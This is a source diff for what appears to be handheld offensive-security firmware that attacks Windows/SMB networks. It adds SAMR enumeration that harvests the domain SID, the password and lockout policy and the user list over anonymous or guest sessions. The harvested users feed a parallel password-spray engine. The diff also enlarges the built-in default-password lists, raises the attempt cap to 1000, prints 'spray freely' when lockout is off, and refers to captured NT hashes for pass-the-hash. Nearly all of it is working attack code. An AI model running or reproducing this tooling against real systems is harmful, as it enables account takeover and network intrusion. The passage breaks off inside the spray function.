@@ -105,9 +105,21 @@ static void smbHmacSha256(const uint8_t* key,size_t klen,const uint8_t* data,siz
 
 struct SmbEntry { String name; bool isDir; uint64_t size; };
 
+// WiFi modem power-save kills latency on a request/response protocol: the radio
+// sleeps between beacons (~100 ms), so each SMB round trip can stall waiting for a
+// wake. We hold the radio awake for the duration of any SMB activity and restore
+// the previous state once the last connection closes (ref-counted for the parallel
+// spray, which opens several sockets at once).
+static void smbWifiAwake(bool on){
+    static int refs=0; static bool prev=false;
+    if(on){ if(refs++==0){ prev=WiFi.getSleep(); WiFi.setSleep(false); } }
+    else  { if(refs>0 && --refs==0){ WiFi.setSleep(prev); } }
+}
+
 class Smb2 {
 public:
     WiFiClient cli;
+    bool awakeHeld=false;            // this instance is holding the radio awake
     uint64_t sessionId=0, msgId=0;
     uint32_t treeId=0;
     IPAddress host;
@@ -124,14 +136,21 @@ public:
     bool    haveSessionKey=false;
     uint8_t sessionKey[16];          // NTLMv2 ExportedSessionKey (== 2.x signing key)
     uint64_t lastMsgId=0;            // MessageId used by the most recent send()
+    // --- non-blocking receive framer (used by the parallel spray) ---
+    std::vector<uint8_t> nbBuf;      // bytes accumulated so far for the in-flight response
+    uint32_t nbNeed=0;               // total Direct-TCP payload expected (0 = still reading the 4-byte prefix)
 
     bool connect(IPAddress ip, uint16_t port=445, uint32_t toMs=4000){
         host=ip; cli.setTimeout(6);
         uint32_t t0=millis();
         if(!cli.connect(ip,port)){ lastError="tcp connect fail"; return false; }
+        cli.setNoDelay(true);   // SMB is a small-packet ping-pong: Nagle + delayed-ACK add tens of ms per round trip
+        if(!awakeHeld){ smbWifiAwake(true); awakeHeld=true; }  // keep the radio out of modem-sleep while we talk SMB
         (void)toMs; (void)t0; return true;
     }
-    void close(){ if(cli.connected()) cli.stop(); sessionId=0; treeId=0; }
+    void close(){ if(cli.connected()) cli.stop(); sessionId=0; treeId=0;
+        if(awakeHeld){ smbWifiAwake(false); awakeHeld=false; } }
+    ~Smb2(){ if(awakeHeld){ smbWifiAwake(false); awakeHeld=false; } }  // never leak the awake ref
 
     // ---- transport: 4-byte Direct-TCP prefix + SMB2 message ----
     bool send(uint16_t cmd, const std::vector<uint8_t>& body, uint16_t creditReq=1, uint16_t creditCharge=0){
@@ -174,9 +193,40 @@ public:
             if(!cli.connected()&&cli.available()==0) return false;
             int a=cli.available();
             if(a>0){ int r=cli.read(buf+got,n-got); if(r>0){got+=r; t0=millis();} }
-            else { if(millis()-t0>toMs) return false; delay(2); }
+            else { if(millis()-t0>toMs) return false; delay(1); }
         }
         return true;
+    }
+    // Non-blocking framer: drains whatever bytes are available, returns one complete
+    // SMB2 message when it has arrived. Call repeatedly from a poll loop over several
+    // connections. 0 = still pending, 1 = 'out' holds a full message (status in
+    // lastStatus), -1 = IO/parse error. Never blocks on the socket.
+    void recvNBreset(){ nbBuf.clear(); nbNeed=0; }
+    int recvNB(std::vector<uint8_t>& out){
+        while(cli.available()>0){
+            uint8_t tmp[600]; int a=cli.available(); if(a>(int)sizeof(tmp)) a=sizeof(tmp);
+            int r=cli.read(tmp,a); if(r<=0) break;
+            nbBuf.insert(nbBuf.end(), tmp, tmp+r);
+        }
+        if(nbNeed==0){
+            if(nbBuf.size()<4){ if(!cli.connected()&&cli.available()==0) return -1; return 0; }
+            uint32_t len=((uint32_t)nbBuf[1]<<16)|((uint32_t)nbBuf[2]<<8)|nbBuf[3];
+            if(len<64||len>262144) return -1;
+            nbNeed=4+len;
+        }
+        if(nbBuf.size()<nbNeed){ if(!cli.connected()&&cli.available()==0) return -1; return 0; }
+        try { out.assign(nbBuf.begin()+4, nbBuf.begin()+nbNeed); } catch(...){ return -1; }
+        nbBuf.erase(nbBuf.begin(), nbBuf.begin()+nbNeed); nbNeed=0;   // keep any pipelined bytes
+        if(out.size()<64 || out[0]!=0xFE) return -1;
+        lastStatus=smbGet32(&out[8]); return 1;
+    }
+    // SESSION_SETUP request body wrapping an NTLMSSP token (shared with loginNtlm's inline builder).
+    std::vector<uint8_t> buildSessionSetupBody(const std::vector<uint8_t>& sec){
+        std::vector<uint8_t> b; smbPut16(b,25); b.push_back(0); b.push_back(1);  // size, flags, secmode
+        smbPut32(b,0); smbPut32(b,0);              // caps, channel
+        smbPut16(b,0x58); smbPut16(b,sec.size());  // secbuf offset(88), len
+        smbPut64(b,0);                             // prev session
+        for(auto c:sec) b.push_back(c); return b;
     }
 
     // ------------------------------ NEGOTIATE ------------------------------
@@ -607,6 +657,71 @@ public:
         if(rx.size()>=64+80){ uint8_t fid[16]; memcpy(fid,&rx[64+64],16); closeFid(fid); } // delete-on-close
         return true;
     }
+
+    // ---------------- generic DCE/RPC over a named pipe (samr/lsarpc/...) ----------------
+    // Reusable plumbing extracted for the MSRPC enumerators. smbEnumShares keeps its
+    // own inline copy untouched; these are additive.
+    bool rpcOpenPipe(const char* name, uint8_t fidOut[16]){
+        return create(name,false,fidOut,nullptr,0x0012019F);          // pipe, read|write
+    }
+    bool rpcPipeWrite(const uint8_t fid[16], const std::vector<uint8_t>& data){
+        std::vector<uint8_t> b; smbPut16(b,49); smbPut16(b,0x70); smbPut32(b,data.size());
+        smbPut64(b,0); for(int i=0;i<16;i++) b.push_back(fid[i]);
+        smbPut32(b,0); smbPut32(b,0); smbPut16(b,0); smbPut16(b,0); smbPut32(b,0);
+        for(auto c:data) b.push_back(c);
+        if(!send(SMB2_WRITE,b)){ lastError="rpcWr send"; return false; }
+        std::vector<uint8_t> rx; uint32_t st=recv(rx);
+        if(st!=NT_SUCCESS){ lastError="rpcWr st "+String(st,HEX); return false; }
+        return true;
+    }
+    bool rpcPipeRead(const uint8_t fid[16], std::vector<uint8_t>& out){
+        std::vector<uint8_t> buf(16384);
+        int n=readChunk(fid,0,16384,buf.data());
+        if(n<0){ lastError="rpcRd io"; return false; }
+        out.assign(buf.begin(),buf.begin()+n); return true;
+    }
+    // bind to an interface (uuid = 16 bytes little-endian, version maj.min)
+    bool rpcBind(const uint8_t fid[16], const uint8_t uuid[16], uint16_t vmaj, uint16_t vmin){
+        std::vector<uint8_t> bind;
+        bind.push_back(5);bind.push_back(0);bind.push_back(11);bind.push_back(3);  // ver, minor, bind, flags(firstfrag|lastfrag)
+        smbPut32(bind,0x00000010);                       // data representation
+        smbPut16(bind,0); smbPut16(bind,0);              // frag len (filled later), auth len
+        smbPut32(bind,1);                                // call id
+        smbPut16(bind,4280); smbPut16(bind,4280);        // max xmit/recv frag
+        smbPut32(bind,0);                                // assoc group
+        bind.push_back(1);bind.push_back(0);bind.push_back(0);bind.push_back(0); // num ctx = 1
+        smbPut16(bind,0); bind.push_back(1); bind.push_back(0);                  // ctx id 0, num transfer syntaxes = 1
+        for(int i=0;i<16;i++) bind.push_back(uuid[i]); smbPut16(bind,vmaj); smbPut16(bind,vmin);
+        { const uint8_t n[16]={0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60};
+          for(int i=0;i<16;i++) bind.push_back(n[i]); smbPut32(bind,2); }            // NDR v2.0 transfer syntax
+        bind[8]=bind.size()&0xff; bind[9]=(bind.size()>>8)&0xff;                      // frag length
+        if(!rpcPipeWrite(fid,bind)) return false;
+        std::vector<uint8_t> brx; if(!rpcPipeRead(fid,brx)) return false;
+        if(brx.size()<4 || brx[2]!=12){ lastError="bind nak"; return false; }         // ptype 12 = bind_ack
+        return true;
+    }
+    // one RPC request: opnum + marshalled stub -> response stub (24-byte RPC header stripped).
+    // Returns NT_SUCCESS on a response PDU, 0xFFFFFFFF on IO/fault (lastError set).
+    uint32_t rpcCall(const uint8_t fid[16], uint16_t opnum, const std::vector<uint8_t>& stub,
+                     std::vector<uint8_t>& out, uint32_t callId=2){
+        std::vector<uint8_t> req;
+        req.push_back(5);req.push_back(0);req.push_back(0);req.push_back(3);  // ver, minor, request, flags
+        smbPut32(req,0x00000010);
+        smbPut16(req,0); smbPut16(req,0);                 // frag len (later), auth len
+        smbPut32(req,callId);
+        smbPut32(req,(uint32_t)stub.size());              // alloc hint
+        smbPut16(req,0);                                  // context id
+        smbPut16(req,opnum);
+        for(auto c:stub) req.push_back(c);
+        req[8]=req.size()&0xff; req[9]=(req.size()>>8)&0xff;
+        if(!rpcPipeWrite(fid,req)) return 0xFFFFFFFF;
+        std::vector<uint8_t> rx; if(!rpcPipeRead(fid,rx)) return 0xFFFFFFFF;
+        if(rx.size()<24){ lastError="rpc resp short"; return 0xFFFFFFFF; }
+        uint8_t ptype=rx[2];                              // 2=response, 3=fault
+        out.assign(rx.begin()+24, rx.end());
+        if(ptype==3){ uint32_t fc=out.size()>=4?smbGet32(&out[0]):0; lastError="rpc fault "+String(fc,HEX); return 0xFFFFFFFF; }
+        return NT_SUCCESS;
+    }
 };
 
 // =================== srvsvc NetrShareEnum over IPC$ =========================
@@ -722,6 +837,160 @@ static bool smbEnumShares(Smb2& s, std::vector<String>& shares){
         // keep disk shares (type low 0) and generic; skip hidden admin $ pipes except show all
         if(nm.length()){ shares.push_back(nm); }
     }
+    return true;
+}
+
+// =================== SAMR / LSA enumeration (enum4linux-style) ==============
+// With ANY session (anon / guest / a credential you hold), walk the SAMR pipe to
+// pull the domain name + SID, the PASSWORD & LOCKOUT policy, and the USER LIST -
+// no password cracking involved. The lockout threshold here is what lets a spray
+// stay safe; the user list is what makes it targeted instead of guesswork.
+struct SamrResults {
+    bool ok=false;
+    String domainName, domainSid;
+    int  minPwdLen=-1, pwdHistory=-1; uint32_t pwdProps=0;
+    long maxPwdAgeDays=-1;
+    int  lockoutThreshold=-1; long lockoutWindowMin=-1, lockoutDurMin=-1;
+    std::vector<std::pair<uint32_t,String>> users;   // (RID, name)
+};
+// parse a SAMPR_ENUMERATION_BUFFER (shared by EnumDomains + EnumDomainUsers).
+// 'o' starts at EnumerationContext (rpcCall already stripped the 24-byte RPC header).
+static void smbParseEnumBuffer(const std::vector<uint8_t>& o, std::vector<std::pair<uint32_t,String>>& out){
+    size_t p=0;
+    auto r8=[&]()->uint8_t{ return p<o.size()?o[p++]:0; };
+    auto r16=[&]()->uint16_t{ if(p+2>o.size())return 0; uint16_t v=smbGet16(&o[p]); p+=2; return v; };
+    auto r32=[&]()->uint32_t{ if(p+4>o.size())return 0; uint32_t v=smbGet32(&o[p]); p+=4; return v; };
+    r32();                             // EnumerationContext
+    uint32_t bufref=r32(); if(!bufref) return;
+    uint32_t entries=r32(); r32();     // EntriesRead, array referent
+    uint32_t maxc=r32();               // conformant MaxCount
+    if(entries>maxc) entries=maxc; if(entries>512) entries=512;
+    struct E{ uint32_t rid; uint32_t nameRef; uint16_t len; };
+    std::vector<E> es(entries);
+    for(uint32_t i=0;i<entries;i++){ E e; e.rid=r32(); e.len=r16(); r16(); e.nameRef=r32(); es[i]=e; }  // RID + RPC_UNICODE_STRING{len,maxlen,ref}
+    for(uint32_t i=0;i<entries;i++){
+        if(!es[i].nameRef) continue;
+        r32(); r32(); uint32_t ac=r32();             // MaxCount, Offset, ActualCount
+        if(p+(size_t)ac*2>o.size()) break;
+        String nm=smbU16ToAscii(&o[p], (int)ac*2);   // counted string, NOT null-terminated
+        p+=(size_t)ac*2; while(p%4) p++;
+        out.push_back(std::make_pair(es[i].rid, nm));
+    }
+}
+static bool smbSamrEnum(Smb2& s, SamrResults& R, bool verbose){
+    static const uint8_t SAMR_UUID[16]={0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xac};
+    uint32_t savedTree=s.treeId;
+    if(!s.treeConnect("IPC$")){ s.lastError="samr tc "+s.lastError; return false; }
+    uint8_t fid[16];
+    if(!s.rpcOpenPipe("samr",fid)){ s.lastError="samr open "+s.lastError; s.treeDisconnect(); s.treeId=savedTree; return false; }
+    auto cleanup=[&](){ s.closeFid(fid); s.treeDisconnect(); s.treeId=savedTree; };
+    if(!s.rpcBind(fid,SAMR_UUID,1,0)){ s.lastError="samr bind "+s.lastError; cleanup(); return false; }
+
+    auto dump=[&](const char* tag,const std::vector<uint8_t>& o){
+        if(!verbose) return; Serial.printf("[SAMR][dbg] %s %d bytes\n",tag,(int)o.size());
+        for(size_t i=0;i<o.size() && i<96;i+=16){ Serial.printf("  %03d:",(int)i);
+            for(size_t j=i;j<i+16&&j<o.size();j++) Serial.printf(" %02x",o[j]); Serial.println(); }
+    };
+    uint32_t cid=2;
+    std::vector<uint8_t> out;
+
+    // --- SamrConnect (opnum 0) -> server handle ---
+    { std::vector<uint8_t> st;
+      smbPut32(st,0x00020000); smbPut16(st,0x005c); smbPut16(st,0);   // ServerName: referent + 1 WCHAR '\' + pad
+      smbPut32(st,0x02000000);                                        // DesiredAccess = MAXIMUM_ALLOWED
+      if(s.rpcCall(fid,0,st,out,cid++)!=NT_SUCCESS){ s.lastError="SamrConnect "+s.lastError; cleanup(); return false; }
+      dump("connect",out);
+      if(out.size()<24){ s.lastError="connect short"; cleanup(); return false; }
+    }
+    uint8_t srvH[20]; memcpy(srvH,out.data(),20);
+
+    // --- SamrEnumDomains (opnum 6) -> domain names ---
+    std::vector<std::pair<uint32_t,String>> doms;
+    { std::vector<uint8_t> st; for(int i=0;i<20;i++) st.push_back(srvH[i]);
+      smbPut32(st,0); smbPut32(st,0xffffffff);                        // EnumContext=0, PreferedMax=all
+      if(s.rpcCall(fid,6,st,out,cid++)!=NT_SUCCESS){ s.lastError="SamrEnumDomains "+s.lastError; cleanup(); return false; }
+      dump("enumdom",out); smbParseEnumBuffer(out,doms);
+    }
+    // pick the account domain (skip "Builtin")
+    for(auto& d:doms){ if(!d.second.equalsIgnoreCase("Builtin")){ R.domainName=d.second; break; } }
+    if(R.domainName.length()==0 && doms.size()) R.domainName=doms[0].second;
+    if(verbose){ Serial.print("[SAMR] domains:"); for(auto&d:doms) Serial.printf(" %s",d.second.c_str()); Serial.println(); }
+
+    // --- SamrLookupDomain (opnum 5) -> domain SID ---
+    std::vector<uint8_t> sidBody; uint8_t subCount=0;
+    { std::vector<uint8_t> st; for(int i=0;i<20;i++) st.push_back(srvH[i]);
+      std::vector<uint8_t> nu; smbAsciiToU16(R.domainName.c_str(),nu); uint32_t nc=nu.size()/2;
+      smbPut16(st,nc*2); smbPut16(st,nc*2); smbPut32(st,0x00020000);  // RPC_UNICODE_STRING len,maxlen,ref
+      smbPut32(st,nc); smbPut32(st,0); smbPut32(st,nc);               // conformant-varying array hdr
+      for(auto c:nu) st.push_back(c);                                 // WCHARs (no null)
+      if(s.rpcCall(fid,5,st,out,cid++)!=NT_SUCCESS){ s.lastError="SamrLookupDomain "+s.lastError; cleanup(); return false; }
+      dump("lookup",out);
+      size_t p=0; auto r32=[&]()->uint32_t{ if(p+4>out.size())return 0; uint32_t v=smbGet32(&out[p]); p+=4; return v; };
+      uint32_t sidref=r32();
+      if(sidref){
+          uint32_t mc=r32(); (void)mc;                                // conformant max = sub count
+          if(p+2<=out.size()){ uint8_t rev=out[p]; subCount=out[p+1]; p+=2;
+              R.domainSid="S-"+String(rev);
+              if(p+6<=out.size()){ uint64_t ia=0; for(int i=0;i<6;i++) ia=(ia<<8)|out[p+i]; p+=6; R.domainSid+="-"+String((unsigned long)ia);
+                  sidBody.push_back(rev); sidBody.push_back(subCount); for(int i=0;i<6;i++) sidBody.push_back(out[p-6+i]);
+                  for(int k=0;k<subCount;k++){ uint32_t sa=r32(); R.domainSid+="-"+String((unsigned long)sa);
+                      sidBody.push_back(sa&0xff); sidBody.push_back((sa>>8)&0xff); sidBody.push_back((sa>>16)&0xff); sidBody.push_back((sa>>24)&0xff); }
+              }
+          }
+      }
+      if(sidBody.empty()){ s.lastError="no domain SID"; cleanup(); return false; }
+    }
+
+    // --- SamrOpenDomain (opnum 7) -> domain handle ---
+    uint8_t domH[20];
+    { std::vector<uint8_t> st; for(int i=0;i<20;i++) st.push_back(srvH[i]);
+      smbPut32(st,0x02000000);                                        // DesiredAccess
+      smbPut32(st,subCount);                                          // SID conformant max count
+      for(auto c:sidBody) st.push_back(c);                            // rev,subcount,idauth,subauths
+      if(s.rpcCall(fid,7,st,out,cid++)!=NT_SUCCESS){ s.lastError="SamrOpenDomain "+s.lastError; cleanup(); return false; }
+      dump("opendom",out);
+      if(out.size()<24){ s.lastError="opendom short"; cleanup(); return false; }
+      memcpy(domH,out.data(),20);
+    }
+
+    // --- SamrQueryDomainInfo level 1 (password policy) ---
+    { std::vector<uint8_t> st; for(int i=0;i<20;i++) st.push_back(domH[i]); smbPut16(st,1);
+      if(s.rpcCall(fid,8,st,out,cid++)==NT_SUCCESS){
+          dump("pwpol",out);
+          size_t p=0; auto r32=[&]()->uint32_t{ if(p+4>out.size())return 0; uint32_t v=smbGet32(&out[p]); p+=4; return v; };
+          uint32_t ref=r32();
+          if(ref && p+4<=out.size()){ p+=2; p+=2;                     // discriminant(2)+pad(2)
+              if(p+24<=out.size()){ R.minPwdLen=smbGet16(&out[p]); R.pwdHistory=smbGet16(&out[p+2]); R.pwdProps=smbGet32(&out[p+4]);
+                  int64_t maxAge=(int64_t)smbGet64(&out[p+8]);        // negative 100ns
+                  if(maxAge!=0 && maxAge!=(int64_t)0x8000000000000000LL) R.maxPwdAgeDays=(long)((-maxAge)/(10000000LL*86400LL)); }
+          }
+      }
+    }
+    // --- SamrQueryDomainInfo level 12 (lockout policy) ---
+    { std::vector<uint8_t> st; for(int i=0;i<20;i++) st.push_back(domH[i]); smbPut16(st,12);
+      if(s.rpcCall(fid,8,st,out,cid++)==NT_SUCCESS){
+          dump("lockout",out);
+          size_t p=0; auto r32=[&]()->uint32_t{ if(p+4>out.size())return 0; uint32_t v=smbGet32(&out[p]); p+=4; return v; };
+          uint32_t ref=r32();
+          if(ref){ p+=2; while(p%8) p++;                             // discriminant + align LARGE_INTEGER to 8
+              if(p+18<=out.size()){ int64_t dur=(int64_t)smbGet64(&out[p]); int64_t win=(int64_t)smbGet64(&out[p+8]);
+                  R.lockoutThreshold=smbGet16(&out[p+16]);
+                  if(dur) R.lockoutDurMin=(long)((-dur)/(10000000LL*60LL));
+                  if(win) R.lockoutWindowMin=(long)((-win)/(10000000LL*60LL)); }
+          }
+      }
+    }
+    // --- SamrEnumDomainUsers (opnum 13) -> user list ---
+    { std::vector<uint8_t> st; for(int i=0;i<20;i++) st.push_back(domH[i]);
+      smbPut32(st,0); smbPut32(st,0); smbPut32(st,0xffffffff);        // EnumContext, UserAccountControl=0(all), PreferedMax
+      if(s.rpcCall(fid,13,st,out,cid++)==NT_SUCCESS){ dump("enumusers",out); smbParseEnumBuffer(out,R.users); }
+    }
+
+    // best-effort close of the two handles (opnum 1)
+    { std::vector<uint8_t> st; for(int i=0;i<20;i++) st.push_back(domH[i]); s.rpcCall(fid,1,st,out,cid++); }
+    { std::vector<uint8_t> st; for(int i=0;i<20;i++) st.push_back(srvH[i]); s.rpcCall(fid,1,st,out,cid++); }
+    cleanup();
+    R.ok=true;
     return true;
 }
 
@@ -843,7 +1112,12 @@ static void smbMsg(const String& l1,const String& l2="",int holdMs=0){
 #define SMB_HOSTS_FILE   "/evil/smb/hosts.txt"
 #define SMB_SESSION_LOG  "/evil/smb/session.log"
 #define SMB_HASHES_FILE  "/evil/smb/smb_hashes.txt"   // captured NT hashes for pass-the-hash
-#define SMB_SPRAY_MAXTRIES 300          // lockout guard: stop a spray after this many attempts
+#define SMB_SPRAY_MAXTRIES 1000         // lockout guard: stop a spray after this many attempts (lab default; lower for real engagements)
+#define SMB_SPRAY_WINDOW     8          // parallel spray: SESSION_SETUP exchanges in flight at once (1 = old sequential path)
+#define SMB_SPRAY_WINDOW_MAX 8          // hard ceiling on concurrent sockets (RAM + server session limits)
+static int smbSprayWindow = SMB_SPRAY_WINDOW;   // runtime-tunable window size
+static int  smbSprayPerUserCap = -1;   // lockout-aware: max passwords/user (-1 = unlimited, 0 = none allowed, >0 = cap)
+static bool smbSprayPassOuter  = false; // true = password-outer order (spread one password across all users first)
 
 static void smbEnsureDir(){
     if(!SD.exists("/evil")) SD.mkdir("/evil");
@@ -1342,6 +1616,52 @@ static bool smbSerialConnectAuth(Smb2& s, IPAddress ip, bool forceGuest=false){
     return true;
 }
 
+// Write enumerated accounts to smb_users.txt (skips machine accounts ending in '$')
+// so the next spray targets the real users instead of guessing. Returns count written.
+static int smbFeedUsersFromEnum(const std::vector<std::pair<uint32_t,String>>& users){
+    smbEnsureDir();
+    File f=SD.open(SMB_USERS_FILE, FILE_WRITE);
+    if(!f) return 0;
+    f.println("# users enumerated via SAMR (smb_enum) - auto-fed for targeted spray");
+    int n=0;
+    for(auto& u:users){ if(u.second.length()==0) continue; if(u.second.endsWith("$")) continue; f.println(u.second); n++; }
+    f.close();
+    return n;
+}
+
+// headless enum4linux-style recon: "smb_enum <ip> [user] [pass]"
+// anon/guest if no creds; pulls domain/SID + password & lockout policy + user list.
+void smbSerialEnum(const String& args){
+    if(WiFi.status()!=WL_CONNECTED){ Serial.println(F("[SMB] not connected to WiFi")); return; }
+    String a=args; a.trim();
+    int s1=a.indexOf(' '); String ipS=(s1<0)?a:a.substring(0,s1); ipS.trim();
+    String rest=(s1<0)?"":a.substring(s1+1); rest.trim();
+    String user="",pass=""; if(rest.length()){ int s2=rest.indexOf(' '); user=(s2<0)?rest:rest.substring(0,s2); pass=(s2<0)?"":rest.substring(s2+1); user.trim(); }
+    IPAddress ip; if(!ip.fromString(ipS)){ Serial.println(F("Usage: smb_enum <ip> [user] [pass]")); return; }
+    smbSerialScreenBegin("enum "+ip.toString());
+    Smb2 s;
+    Serial.printf("[SMB] connect %s:445 ... ", ip.toString().c_str());
+    if(!s.connect(ip)){ Serial.printf("FAIL (%s)\n", s.lastError.c_str()); smbSerialScreenEnd(); return; }
+    Serial.println("ok");
+    if(!s.negotiate()){ Serial.printf("[SMB] negotiate FAIL (%s)\n", s.lastError.c_str()); s.close(); smbSerialScreenEnd(); return; }
+    bool authed = user.length()? s.authenticateUser(user,pass) : s.authenticate();
+    Serial.printf("[SMB] auth %s ... %s\n", user.length()?user.c_str():"anon/guest", authed?"ok":("FAIL: "+s.lastError).c_str());
+    if(!authed){ s.close(); smbSerialScreenEnd(); return; }
+    SamrResults R;
+    Serial.println("[SMB] SAMR enumeration ...");
+    if(!smbSamrEnum(s,R,true)){ Serial.printf("[SMB] SAMR FAIL (%s)\n", s.lastError.c_str()); s.close(); smbSerialScreenEnd(); return; }
+    Serial.printf("[SMB] domain : %s   SID: %s\n", R.domainName.c_str(), R.domainSid.c_str());
+    Serial.printf("[SMB] pwd policy: minlen=%d history=%d maxage=%ldd props=0x%08x\n", R.minPwdLen, R.pwdHistory, R.maxPwdAgeDays, R.pwdProps);
+    if(R.lockoutThreshold==0) Serial.println("[SMB] lockout : DISABLED (threshold 0) -> spray freely");
+    else Serial.printf("[SMB] lockout : threshold=%d window=%ldmin duration=%ldmin\n", R.lockoutThreshold, R.lockoutWindowMin, R.lockoutDurMin);
+    Serial.printf("[SMB] users (%d):\n", (int)R.users.size());
+    for(auto& u:R.users) Serial.printf("[SMB]   RID %-6u %s\n", (unsigned)u.first, u.second.c_str());
+    if(R.users.size()){ int n=smbFeedUsersFromEnum(R.users); Serial.printf("[SMB] fed %d user(s) -> %s (ready for smb_spray)\n", n, SMB_USERS_FILE); }
+    s.close();
+    Serial.println("=== smb_enum done ===");
+    smbSerialScreenEnd();
+}
+
 // Fast live-host sweep of the local /24.
 //  etharp_request() from the app task does NOT populate the ARP cache (lwip
 //  wants stack calls on the tcpip thread), so instead we send a tiny UDP
@@ -1765,11 +2085,17 @@ static int smbSeedWordlists(bool force, bool& wroteU, bool& wroteP){
     wroteU=wroteP=false;
     static const char* users[]={
         "administrator","admin","guest","user","root","test",
-        "backup","nas","qnap","pi","oracle","sa", 0 };
+        "backup","nas","qnap","synology","pi","oracle","sa","ftp",
+        "www","web","service","operator","manager","supervisor",
+        "support","info","scanner","print","smbuser", 0 };          // 25
     static const char* pass[]={
         "password","admin","123456","12345678","123456789","admin123",
         "password1","Password1","root","toor","qwerty","letmein","welcome",
-        "changeme","P@ssw0rd","nas","1234","test","guest","raspberry", 0 };
+        "changeme","P@ssw0rd","nas","1234","test","guest","raspberry",
+        "synology","qnapadmin","12345","1234567890","abc123","admin@123",
+        "Admin123","Welcome1","Welcome123","P@ssword1","Passw0rd",
+        "Summer2024","Winter2024","Autumn2024","Spring2024","Summer2025",
+        "Password123","Qwerty123","iloveyou","000000", 0 };          // 40  (25x40 = 1000)
     if(force || !SD.exists(SMB_USERS_FILE)){
         File f=SD.open(SMB_USERS_FILE, FILE_WRITE);
         if(f){ f.println("# common SMB usernames (SecLists-derived) - one per line, # = comment");
@@ -1820,7 +2146,189 @@ static int smbCountLines(const char* path){
     if(f){ while(f.available()){ String l=f.readStringUntil('\n'); l.trim(); if(l.length() && l[0]!='#') n++; } f.close(); }
     return n;
 }
+// Credential source for the spray. Combo mode keeps only the two wordlists in RAM
+// (users + passwords ~ a few KB) and generates each pair by index, so a 25x40 = 1000
+// spray costs ~4KB instead of materializing 1000 String pairs (~64KB -> OOM). Creds-
+// file mode loads user:password pairs (bounded by the lockout cap; these files are
+// small and user-curated). total is already clamped to SMB_SPRAY_MAXTRIES.
+struct SprayFeeder {
+    bool combo=false, passOuter=false;
+    std::vector<String> users, pass;                 // combo mode
+    std::vector<std::pair<String,String>> pairs;      // creds-file mode
+    int total=0;
+    void getCred(int k, String& u, String& p) const {
+        if(combo){ int nu=(int)users.size(), np=(int)pass.size();
+            if(passOuter){ u=users[k%nu]; p=pass[k/nu]; }    // one password across all users first (lockout-safe spread)
+            else         { u=users[k/np]; p=pass[k%np]; }    // user outer (same order as the sequential path)
+        } else { u=pairs[k].first; p=pairs[k].second; }
+    }
+};
+static void smbLoadSprayFeeder(SprayFeeder& fd){
+    fd.combo = SD.exists(SMB_USERS_FILE) && SD.exists(SMB_PASS_FILE);
+    if(fd.combo){
+        File uf=SD.open(SMB_USERS_FILE, FILE_READ);
+        if(uf){ while(uf.available()){ String u=uf.readStringUntil('\n'); u.trim(); if(u.length()&&u[0]!='#') fd.users.push_back(u); } uf.close(); }
+        File pf=SD.open(SMB_PASS_FILE, FILE_READ);
+        if(pf){ while(pf.available()){ String p=pf.readStringUntil('\n'); p.trim(); if(p.length()&&p[0]!='#') fd.pass.push_back(p); } pf.close(); }
+        fd.passOuter=smbSprayPassOuter;
+        long t=(long)fd.users.size()*(long)fd.pass.size();
+        if(t>SMB_SPRAY_MAXTRIES) t=SMB_SPRAY_MAXTRIES;
+        if(smbSprayPerUserCap>=0){ long cap=(long)smbSprayPerUserCap*(long)fd.users.size(); if(t>cap) t=cap; }  // lockout-safe: <= cap passwords/user
+        fd.total=(int)t;
+    } else {
+        File f=SD.open(SMB_CREDS_FILE, FILE_READ);
+        if(f){
+            while(f.available()){
+                if((int)fd.pairs.size()>=SMB_SPRAY_MAXTRIES) break;
+                String line=f.readStringUntil('\n'); line.trim();
+                if(line.length()==0 || line[0]=='#') continue;
+                int c=line.indexOf(':');
+                String u=(c<0)?line:line.substring(0,c); String p=(c<0)?"":line.substring(c+1); u.trim();
+                if(u.length()) fd.pairs.push_back(std::make_pair(u,p));
+            }
+            f.close();
+        }
+        fd.total=(int)fd.pairs.size();
+    }
+}
+
+// Parallel spray engine: W connections, each pipelining SESSION_SETUP exchanges so
+// the WiFi round-trip latency of one attempt is hidden behind the others. conn[0]
+// reuses the caller's already-negotiated 's'; the rest are opened here and torn down
+// at the end. On a hit, 's' is re-authenticated with the winning credential so the
+// caller can keep using it (tree connect, listing) exactly like the sequential path.
+// Honors the lockout cap (counted across all connections) and backspace abort.
+static bool smbTryCredsFileParallel(Smb2& s, int* triedOut, String* hitOut, bool verbose, bool showUI, int W){
+    if(triedOut) *triedOut=0;
+    SprayFeeder fd; smbLoadSprayFeeder(fd);
+    if(fd.total==0){ s.lastError="no creds file"; return false; }
+    int total=fd.total;
+
+    if(W<1) W=1; if(W>SMB_SPRAY_WINDOW_MAX) W=SMB_SPRAY_WINDOW_MAX;
+    // don't open more sockets than the heap can safely back. A spray socket carries
+    // only tiny SESSION_SETUP messages, so real cost is ~4KB/conn; keep a 30KB floor.
+    int heapW=(int)((ESP.getFreeHeap()-30000)/4000); if(heapW<1) heapW=1;
+    if(W>heapW) W=heapW;
+    IPAddress ip=s.host;
+
+    struct PC { Smb2* s; int st; int retries; uint32_t tSent; String user,pass,domain; uint8_t challenge[8]; std::vector<uint8_t> ti; };
+    std::vector<Smb2> extra;                 // conn[1..W-1] (conn[0] is the caller's s)
+    int nExtra=W-1; if(nExtra>0) extra.resize(nExtra);
+    std::vector<PC> pc(W);
+    for(int i=0;i<W;i++){ pc[i].st=0; pc[i].retries=0; pc[i].s = (i==0)? &s : &extra[i-1]; }
+    for(int i=1;i<W;i++){                     // bring up the extra connections; failures just run with fewer
+        if(!(pc[i].s->connect(ip) && pc[i].s->negotiate())) pc[i].st=3;
+    }
+    if(verbose){ int up=0; for(int i=0;i<W;i++) if(pc[i].st!=3) up++; Serial.printf("[SPRAY] parallel window = %d connection(s)\n", up); }
+
+    auto drawSpray=[&](const String& cred,int tried){
+        if(!showUI) return;
+        M5.Display.fillRect(2,40,234,66,SMB_BG);
+        M5.Display.setTextFont(1); M5.Display.setTextSize(1.5); M5.Display.setTextColor(SMB_TEXT,SMB_BG);
+        char t[24]; snprintf(t,sizeof t,"try %d / %d", tried, total);
+        M5.Display.setCursor((240-M5.Display.textWidth(t))/2,46); M5.Display.print(t);
+        String c=smbClip(cred,24); M5.Display.setTextColor(SMB_TITLE,SMB_BG);
+        M5.Display.setCursor((240-M5.Display.textWidth(c))/2,66); M5.Display.print(c);
